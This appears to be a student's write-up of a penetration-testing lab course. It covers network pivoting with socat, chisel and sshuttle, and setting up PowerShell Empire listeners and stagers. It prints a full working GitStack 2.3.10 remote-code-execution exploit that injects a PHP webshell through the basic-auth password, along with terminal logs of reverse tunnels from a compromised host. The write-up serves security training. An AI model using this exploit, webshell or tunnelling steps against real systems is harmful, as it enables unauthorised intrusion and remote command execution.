This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:
![222](https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png)
- The request goes to `127.0.0.1:8000`
- Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
- Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.
The process is then reversed when the target sends the response:
- The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
- Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.
We have now achieved the same thing as previously, but without opening any ports on the server!
---
Finally, we've learnt how to _create_ backgrounded socat port forwards and relays, but it's important to also know how to _close_ these. The solution is simple: run the `jobs` command in your terminal, then kill any socat processes using `kill %NUMBER`:
![Demonstration for how to kill background jobs](https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png)
---
**For the following questions, assume that we are working with a local copy of socat called `socat` in the current directory.**
---
Answer the questions below
[**Video**](https://youtu.be/6lG2JnmxI_g)
[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn't require SSH access on the compromised target is a big bonus.
Before we can use chisel, we need to download appropriate binaries from the tool's [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using `gunzip`, and executed as normal:
![Demonstrating a download and unzip of the chisel tool set using wget for the tar.gz files from github, then gunzip to decompress the files](https://assets.tryhackme.com/additional/wreath-network/490577b29cce.png)
You must have an appropriate copy of the chisel binary on _both the attacking machine and the compromised server._ Copy the file to the remote server with your choice of file transfer method. You could use the webserver method covered in the previous tasks, or to shake things up a bit, you could use SCP:
`scp -i KEY chisel user@target:/tmp/chisel-USERNAME`
---
The chisel binary has two modes: _client_ and _server_. You can access the help menus for either with the command: `chisel client|server --help`
e.g:
![Demonstrating the chisel server help menu with chisel server --help](https://assets.tryhackme.com/additional/wreath-network/9435cdc6e54d.png)
We will be looking at two uses for chisel in this task (a SOCKS proxy, and port forwarding); however, chisel is a very versatile tool which can be used in many ways not described here. You are encouraged to read through the help pages for the tool for this reason.
---
__**Reverse SOCKS Proxy:**_
_Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects _back_ from a compromised server to a listener waiting on our attacking machine.
On our own attacking box we would use a command that looks something like this:
`./chisel server -p LISTEN_PORT --reverse &   `
This sets up a listener on your chosen `LISTEN_PORT`.
On the compromised host, we would use the following command:
`./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`
This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (`&`) to background the processes.
![Demonstrating a successful connection with chisel](https://assets.tryhackme.com/additional/wreath-network/a27fb82676b4.png)
Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on `127.0.0.1:1080`. As such, we will be using port 1080 when sending data through the proxy.
Note the use of `R:socks` in this command. "R" is prefixed to _remotes_ (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended.
__**Forward SOCKS Proxy:**_
_Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.
In many ways the syntax for this is simply reversed from a reverse proxy.
First, on the compromised host we would use:
`./chisel server -p LISTEN_PORT --socks5`
On our own attacking box we would then use:
`./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`
In this command, `PROXY_PORT` is the port that will be opened for the proxy.
For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.
**Proxychains Reminder:**
When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from `socks4` to `socks5`:
`[ProxyList]   # add proxy here ...   # meanwhile   # defaults set to "tor"   socks5  127.0.0.1 1080   `
**_Note:_** _The above configuration is for a reverse SOCKS proxy -- as mentioned previously, the proxy opens on port 1080 rather than the specified listening port (1337). If you use proxychains with a forward proxy then the port should be set to whichever port you opened (1337 in the above example)._
---
Now that we've seen how to use chisel to create a SOCKS proxy, let's take a look at using it to create a port forward with chisel.
_**Remote Port Forward:**_A remote port forward is when we connect back from a compromised target to create the forward.
For a remote port forward, on our attacking machine we use the exact same command as before:
`./chisel server -p LISTEN_PORT --reverse &`
Once again this sets up a chisel listener for the compromised host to connect back to.
The command to connect back is slightly different this time, however:
`./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`
You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons. Note the distinction between the `LISTEN_PORT` and the `LOCAL_PORT`. Here the `LISTEN_PORT` is the port that we started the chisel server on, and the `LOCAL_PORT` is the port we wish to open on our own attacking machine to link with the desired target port.
To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:
`./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &`
Connecting back to our attacking machine, functioning as a chisel server started with:
`./chisel server -p 1337 --reverse &`
This would allow us to access 172.16.0.10:22 (via SSH) by navigating to 127.0.0.1:2222.
__**Local Port Forward:**_
_As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
On the compromised target we set up a chisel server:
`./chisel server -p LISTEN_PORT`
We now connect to this from our attacking machine like so:
`./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`
For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
`./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`
---
As with the backgrounded socat processes, when we want to destroy our chisel connections we can use `jobs` to see a list of backgrounded jobs, then `kill %NUMBER` to destroy each of the chisel processes.
_**Note:** When using Chisel on Windows, it's important to remember to upload it with a file extension of_ `.exe` _(e.g._ `chisel.exe`_)!_
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ cp /home/witty/Downloads/chisel .

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ scp -i wreath_idrsa chisel root@10.200.81.200:/tmp/chisel-witty  
chisel                                                      100% 8545KB 820.6KB/s   00:10 

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ ./chisel server -p 1337 --reverse &
[1] 936723
                                                                                              
 server: Reverse tunnelling enabled
 server: Fingerprint LvQhUQwVMl89pB90mvhSGlvc9SQ0QdiRMW6LLr3Vyy4=

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$  server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

[root@prod-serv tmp]# ./chisel-witty client 10.50.82.74:1337 R:socks &
[1] 2199
[root@prod-serv tmp]#  client: Connecting to ws://10.50.82.74:1337
 client: Connected (Latency 194.462716ms)

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ kill %1    
                                                                                                
[1]  + terminated  ./chisel server -p 1337 --reverse
```
What command would you use to start a chisel server for a reverse connection on your attacking machine?
Use port 4242 for the listener and **do not** background the process.
Assume that the copy of chisel is called "chisel" and is in your current directory.
*./chisel server -p 4242 --reverse*
What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
*./chisel client 172.16.0.200:4242 R:socks &*
How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
*./chisel client 172.16.0.100:1337 R:33060:172.16.0.200:1337 &*
If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
*./chisel client 172.16.0.5:4444 8000:172.16.0.10:80*
[**Video**](https://youtu.be/1hkXgz-qttY)
Finally, let's take a look at our last tool of this section: [sshuttle](https://github.com/sshuttle/sshuttle).
This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy _without the use of proxychains_ (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server.
Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it _is_ an option, it tends to be a superb bet!
First of all we need to install sshuttle. On Kali this is as easy as using the `apt` package manager:
`sudo apt install sshuttle`
---
The base command for connecting to a server with sshuttle is as follows:
`sshuttle -r username@address subnet`
For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
`sshuttle -r user@172.16.0.5 172.16.0.0/24`
We would then be asked for the user's password, and the proxy would be established. The tool will then just sit passively in the background and ![222](https://assets.tryhackme.com/additional/wreath-network/OWFkMzlhNjkw.png)forward relevant traffic into the target network.
Rather than specifying subnets, we could also use the `-N` option which attempts to determine them automatically based on the compromised server's own routing table:
`sshuttle -r username@address -N`
Bear in mind that this may not always be successful though!
As with the previous tools, these commands could also be backgrounded by appending the ampersand (`&`) symbol to the end.
If this has worked, you should see the following line:
`c : Connected to server.`
---
Well, that's great, but what happens if we don't have the user's password, or the server only accepts key-based authentication?
Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the `--ssh-cmd` switch.
This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply `ssh` with no arguments. With the `--ssh-cmd` switch, we can pick a different command to execute for authentication: say, `ssh -i keyfile`, for example!
So, when using key-based authentication, the final command looks something like this:
`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`
To use our example from before, the command would be:
`sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`
---
**Please Note:** When using sshuttle, you may encounter an error that looks like this:
`client: Connected.   client_loop: send disconnect: Broken pipe   client: fatal: server died with error code 255`
This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.
To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
To use our earlier example:
`sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`
This will allow sshuttle to create a connection without disrupting itself.
Answer the questions below
[**Video**](https://youtu.be/3DFvx6TDSxE)
That was a long and theory-heavy section, so kudos for getting this far!
The big take away from this section is: there are _many_ different ways to pivot through a network. Further research in your own time is highly recommended, as there are a great many interesting techniques which we haven't had time to cover here (for example, on a fully rooted target, it's possible to use the installed firewall -- e.g. iptables or Windows Firewall -- to create entry points into an otherwise inaccessible network. Equally, it's possible to set up a route manually in the routing table of your attacking machine to, routing your traffic into the target network without requiring a proxy-tool like Proxychains or Foxyproxy).
As a summary of the tools in this section:
- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
- SSH can be used to create both port forwards, and proxies
- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
- sshuttle is a nicer way to create a proxy when we have SSH access on a target
Pivoting truly is a vast topic; however, hopefully you've learnt something by covering the theory in this section!
This is a good time to experiment with the techniques demonstrated in the pivoting section, so play around with them all and make sure you're comfortable with them before moving on.
_**Note:** If using socat, or any other techniques that open up a port on the compromised host (in the course of this network), please make sure to use a port above 15000, for the sake of other users in earlier sections of the course._
Answer the questions below
Read the conclusion and experiment with the pivoting techniques demonstrated.
Question Done
[**Video**](https://youtu.be/Q5b60n-jkf0)
It's time to put your newfound knowledge to the test!
Download a [static nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true). Rename it to `nmap-USERNAME`, substituting in your own TryHackMe username. Finally, upload it to the target in a manner of your choosing.
**For example, with a Python webserver:-**
On Kali (inside the directory containing your Nmap binary):
`sudo python3 -m http.server 80`
Then, on the target:
`curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME   `
![Using cURL and a Python HTTP server to upload nmap to the target](https://assets.tryhackme.com/additional/wreath-network/f621bb960163.png)
---
Now use the binary to scan the network. The command will look something like this:
`./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME`
You will need to substitute in your username, and the correct IP range. For example:
`./nmap-MuirlandOracle -sn 10.200.72.1-255 -oN scan-MuirlandOracle`
Here the `-sn` switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.
Note that this would also work with CIDR notation (e.g. 10.x.x.0/24).
Use what you've learnt to answer the following questions!
_**Note:** The host ending in_ `.250` _is the OpenVPN server, and should be excluded from all answers. It is not part of the vulnerable network, and should not be targeted. The same goes for the host ending in_ `.1` _(part of the AWS infrastructure used to create the network) -- this too is out of scope and should be excluded from all answers._
Answer the questions below
[**Video**](https://youtu.be/D2wSFFrpPQA)
Thinking about the interesting service on the next target that we discovered in the previous task, pick a pivoting technique and use it to connect to this service, using the web browser on your attacking machine!
As a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. This is because the firewall on the CentOS target will prove problematic with some of the techniques shown here. We will learn how to mitigate against this later in the room, although if you're comfortable opening up a port using firewalld then port forwarding or a proxy would also work.
Answer the questions below
[**Video**](https://youtu.be/vnwUTeIXbxM)
In the previous task we found an exploit that might work against the service running on the second server.
Make a copy of this exploit in your local directory using the command:
`searchsploit -m EDBID`
![Using searchsploit to copy the exploit to the local directory](https://assets.tryhackme.com/additional/wreath-network/74c9d9ad5c3a.png)
Unfortunately, the local exploit copies stored by searchsploit use DOS line endings, which can cause problems in scripts when executed on Linux:
![Demonstration of the line endings error which can occur when trying to run scripts written on Windows on a Linux machine](https://assets.tryhackme.com/additional/wreath-network/c8bf9c7b639a.png)
Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:
`dos2unix ./EDBID.py`
This  can also be done manually with `sed` if `dos2unix` is unavailable:
`sed -i 's/\r//' ./EDBID.py`
---
With the file converted, it's time to read through the exploit to make sure we know what it's doing. The fact that the exploit is on Exploit-DB means that it's unlikely to be outright malicious, but there's no guarantee that it will _work_, or do anything close to exploiting a vulnerabilty in the service.
Open the exploit in your favourite text editor and let's get going!
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ searchsploit -m 43777.py
  Exploit: GitStack 2.3.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/43777
     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/witty/Downloads/CVE-2019-15107/43777.py

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ chmod +x 43777.py             
                                                                           
┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ ./43777.py                       
import-im6.q16: attempt to perform an operation not allowed by the security policy `PS' @ error/constitute.c/IsCoderAuthorized/421.
./43777.py: 18: from: not found
import-im6.q16: attempt to perform an operation not allowed by the security policy `PS' @ error/constitute.c/IsCoderAuthorized/421.
import-im6.q16: attempt to perform an operation not allowed by the security policy `PS' @ error/constitute.c/IsCoderAuthorized/421.
Object "=" is unknown, try "ip help".
./43777.py: 25: =: not found
./43777.py: 27: repository: not found
./43777.py: 28: username: not found
./43777.py: 29: password: not found
./43777.py: 30: csrf_token: not found
./43777.py: 32: user_list: not found
Warning: unknown mime-type for "[+] Get user list" -- using "application/octet-stream"
Error: no such file "[+] Get user list"
./43777.py: 35: try:: not found
./43777.py: 36: Syntax error: "(" unexpected
                                                                           
┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ dos2unix 43777.py                                                  
dos2unix: converting file 43777.py to Unix format...

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ sed -i 's/\r//' ./43777.py
```
```text
# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
```
```text
# Date: 18.01.2018
```
```text
# Software Link: https://gitstack.com/
```
```text
# Exploit Author: Kacper Szurek
```
```text
# Contact: https://twitter.com/KacperSzurek
```
```text
# Website: https://security.szurek.pl/
```
```text
# Category: remote
#
#1. Description
#
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = '192.168.1.102'
```
```text
# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print "[+] Get user list"
try:
	r = requests.get("http://{}/rest/user/".format(ip))
	user_list = r.json()
	user_list.remove('everyone')
except:
	pass

if len(user_list) > 0:
	username = user_list[0]
	print "[+] Found user {}".format(username)
else:
	r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
	print "[+] Create user"

	if not "User created" in r.text and not "User already exist" in r.text:
		print "[-] Cannot create user"
		os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
	print "[+] Web repository already enabled"
else:
	print "[+] Enable web repository"
	r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
	if not "Web interface successfully enabled" in r.text:
		print "[-] Cannot enable web interface"
		os._exit(0)

print "[+] Get repositories list"
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
	repository = repository_list[0]['name']
	print "[+] Found repository {}".format(repository)
else:
	print "[+] Create repository"

	r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
	if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
		print "[-] Cannot create repository"
		os._exit(0)

print "[+] Add user to repository"
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
	print "[-] Cannot add user to repository"
	os._exit(0)

print "[+] Disable access for anyone"
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
	print "[-] Cannot remove access for anyone"
	os._exit(0)

print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ head -n18 43777.py
#!/usr/bin/python2
```
```text
# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
```
```text
# Date: 18.01.2018
```
```text
# Software Link: https://gitstack.com/
```
```text
# Exploit Author: Kacper Szurek
```
```text
# Contact: https://twitter.com/KacperSzurek
```
```text
# Website: https://security.szurek.pl/
```
```text
# Category: remote
#
#1. Description
#
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
import requests

┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
└─$ tail 43777.py        
	print "[-] Cannot remove access for anyone"
	os._exit(0)

print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit_witty.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit_witty.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')
```
Look at the information at the top of the script. On what date was this exploit written?
*18.01.2018*
As this is a Python script, the version of the language used to write the software matters. Many older exploits are still written in Python2. These exploits tend to be incompatible with the Python3 interpreter, and vice versa.
Before we can do anything else, we need to determine whether this exploit was written in Python2 or Python3. A quick way of doing this is to look for the `print` statements (used to echo output to the console).  If there are no round brackets (e.g. `print "Hello World!"`) then the exploit will be Python2, otherwise the exploit is likely to be Python3 (e.g. `print("Hello World!")`). Of course, this is far from the only way to check, but it will work for our purposes.
Bearing this in mind, is the script written in Python2 or Python3?
*Python2*
Now that we know which version of Python we're dealing with we can execute it in one of two ways:
- Using the appropriate interpreter directly (e.g. `python3 exploit.py` / `python2 exploit.py`)
- Adding a shebang line in at the top of the exploit. A shebang tells the Unix program loader which interpreter to use to run a script. Shebangs always start with the characters: `#!`. You then specify the absolute path to the interpreter, so: `#!/usr/bin/python3` / `#!/usr/bin/python2` / `#!/bin/sh`, etc. This means that if we execute the script using `./exploit.py`, it will be executed by the correct interpreter.
Add an appropriate shebang to the exploit, at the very top of the file!
Completed
Let's have a look through some of the key sections of the code.
This script is not designed to be fancy. It does what we need it to do, and nothing more. All configurations are done within the code by literally editing the script, so it's important that we understand the options available to us. These can be found in lines 23-31 (offset by minus one if you didn't add the shebang):
![Lines 23-31 of the exploit](https://assets.tryhackme.com/additional/wreath-network/b6d7392de1b7.png)
Realistically we are only interested in the first two variables here, as the other options should be fine at their default values. The two variables we care about are `ip` and `command`, allowing us to specify our target and the command to run, respectively.
Set the IP to the correct target for your choice of pivoting technique. If you used sshuttle or one of the proxying techniques then this will just be the IP of the target. If you used a port forward then it will be `localhost:chosen_port`, e.g.:
`localhost:8000`
For the time being we will leave the command as it is. `whoami` is as good a command as any to confirm that the exploit works.
The bulk of the middle section of the code is taking advantage of the improper access controls which make this vulnerability possible. We will not cover this in detail in order to keep this task relatively short; however, reading through the exploit (and trying to understand it) would be highly advisable.
We are, however, interested in the last 6 lines of the exploit:
![Last six lines of the exploit set to the default values](https://assets.tryhackme.com/additional/wreath-network/0c95035c81e7.png)
These create a PHP webshell (`<?php system($_POST['a']); ?>`) and echo it into a file called `exploit.php` under the webroot. This can then be accessed by posting a command to the newly created `/web/exploit.php` file.
For the sake of not spoiling things for other users, we are going to alter this before running the script.
We can leave the payload as it is, but we will alter both instances of "exploit.php" in the script to be `exploit-USERNAME.php`, for example:
![Last six lines of the exploit when altered to include a username](https://assets.tryhackme.com/additional/wreath-network/312cae5fdfc7.png)
---
Having added in a shebang, changed the target, and updated the name of the exploit.php file, the exploit should now be fully configured so we will perform the exploit in the next task.
Just to confirm that you have been paying attention to the script: What is the _name_ of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
Check the cookies={} parameter in the post request. The answer is the first string in the dictionary of cookies passed into the function.
*csrftoken*
[**Video**](https://youtu.be/9cfVFaH3Ty0)
Powershell Empire has several major sections to it, which we will be covering in the upcoming tasks.
- **Listeners** are fairly self-explanatory. They listen for a connection and facilitate further exploitation
- **Stagers** are essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. They are the delivery mechanism for agents
- **Agents** are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system
- **Modules** are used to in conjunction with agents to perform further exploitation. For example, they can work through an existing agent to dump the password hashes from the server
Empire also allows us to add in custom **plugins** which extend the functionality of the framework in various ways; however, we will not be covering this in the upcoming content.
In addition to these practical applications of the framework, it also has a nifty credential storage facility, automatically storing any found creds in a local database, plus many other neat features! Many of these extra features (such as the messaging functionality) are tailored for teams attacking a target; we will not be covering these collaborative features in much detail, but you are encouraged to look at them for yourself!
There is a problem though. As established previously, our target (the Git Server) does not have the ability to connect directly to our attacking machine. Due to how Empire handles pivoting, we will need to set up a special kind of listener, so before we do that, we will learn the "normal" process for setting up Empire and Starkiller using the already compromised Webserver as a target. Once we have a handle on how Empire operates, we will switch focus to our primary target: the Git Server.
In each of the following tasks, we will cover the relative section in both the Empire CLI and the Starkiller GUI. You are welcome to pick whichever one you prefer -- or follow along with both!
Let's set up our first listener!
Answer the questions below
Read the overview
Question Done
Can we get an agent back from the git server directly (Aye/Nay)?
*Nay*
### Task 25  Command and Control Empire: Listeners
[**Video**](https://youtu.be/d0PDMkeVEW4)
Listeners in Empire are used to receive connections from stagers (which we'll look at in the next task). The default listener is the `HTTP` listener. This is what we will be using here, although there are many others available. It's worth noting that a single listener can be used more than once -- they do not die after their first usage.
---
Let's start by setting up a listener in the Empire CLI Client.
Having started the client, we are met with the following menu:
![Demonstration of connecting with the Empire CLI Client](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ba333000239e.png)
To select a listener we would use the `uselistener` command. To see all available listeners, type `uselistener`  (making sure to include the space at the end!) -- this should bring up a dropdown menu of available listeners:
![Dropdown showing the listeners available](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ecc40f11478c.png)
When you've picked a listener, type `uselistener LISTENER` and press enter to select it; alternatively, the up and down arrow keys can also be used to traverse the dropdown, with the chosen listener again being selected by pressing enter. Here we will be using the `http` listener (the most common kind), so we use `uselistener http`:
![Screenshot showing the options table for the selected listener](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/e79c26064a34.png)
This brings up a huge table of options for the listener. If we need to see an updated copy of this table (having set options, for example), we can access it again with the `options` command when in the context of the listener.
The syntax for setting options is identical to the Metasploit module options syntax -- `set OPTION VALUE`. Once again, a dropdown will appear showing us the available options after we type `set` .
Set a new name for the listener. This allows us to easily identify it later -- especially if we have several open. It is not essential, however, and can be left at the default `http` if preferred.
That said, some options _must_ be set. At a bare minimum we must set the host (to our own IP address) and port:
![Demo of setting the options for name, host and port](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/a5d0eb75224f.png)
Bear in mind that option names are case sensitive in Empire.
Many of the other options presented here are extremely useful, so it's well worth learning what they do and how they can be applied.
With the required options set, we can start the listener with: `execute`. We can then exit out of this menu using `back`, or exit to the main menu with `main`.
To view our active listeners we can type listeners then press enter:
![](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/9e5c79b3eec7.png)
When we want to stop a listener, we can use `kill LISTENER_NAME` to do so --  a dropdown menu with our active listeners will once again appear to assist.
---
We have a listener in the Empire CLI; now let's do the same thing in Starkiller!
When we first launched Starkiller, we were placed automatically in the Listeners menu:
![The listeners menu of Starkiller](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/d8d7fd792211.png)
The process of creating a listener with the GUI is very intuitive. Click the "Create " button.
In the menu that pops up, set the Type to `http`, the same as with the Empire Listener we created before. Several new options will appear:
![Available options for listeners in Starkiller](https://assets.tryhackme.com/additional/wreath-network/efec537b41f2.png)
Notice that these options are identical to those we saw earlier in the CLI version.
Once again, set the Name, Host, and Port for the listener (make sure to use a different port from previously if you already have an Empire listener started!):
![Setting the name, host, and port options for the Starkiller listener](https://assets.tryhackme.com/additional/wreath-network/4ac9e0c14358.png)
With the options set, click "Submit" at the top of the page, then go back to the Listeners menu by clicking on "Listeners" at the top left of the page. Back on the main Listeners page you will see your created listener!
![The listeners menu with the Starkiller listener started](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/8d93b44295ba.png)
_**Note:** if you also have a listener set up in Empire, this will also show up here._
Answer the questions below
Start a listener in Empire and/or Starkiller
Completed
### Task 26  Command and Control Empire: Stagers
[**Video**](https://youtu.be/32OpGDlJBDg)
Stagers are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed.
We can generate stagers in either Empire CLI or Starkiller. In most cases these will be given as script files to be uploaded to the target and executed. Empire gives us a huge range of options for creating and obfuscating stagers for AV evasion; however, we will not be going into a lot of detail about these here.
---
Let's first look at generating stagers in the Empire CLI application.
From the main Empire prompt, type `usestager`  (including the space!)  to get a list of available stagers in a dropdown menu.
There are a variety of options here. When in doubt, `multi/launcher` is often a good bet. In this case, let's go for `multi/bash` (`usestager multi/bash`):
![Showing the options for usestager multi/bash after selection](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/ce5729866d07.png)
As with listeners, we set options with `set OPTION VALUE`. There are many options here, but the only thing we need do is set the listener to the name of the listener we created in the previous task, then tell Empire to `execute`, creating the stager in our `/tmp` directory:
![Setting the listener to connect to, then executing the stager](https://assets.tryhackme.com/additional/wreath-network/empire-update-4.0/3e295bf67fb9.png)
We now need to get the stager to the target and executed, but that is a job for later on. In the meantime we can save the stager into a file on our own attacking machine then once again exit out of the stager menu with `back`.
---
Not unexpectedly, the process for generating stagers with Starkiller is almost identical.
First we switch over to the Stagers menu on the left hand side of the interface:
![Showing the stagers menu on the left hand side of the Starkiller interface](https://assets.tryhackme.com/additional/wreath-network/8a10ffe7d3be.png)
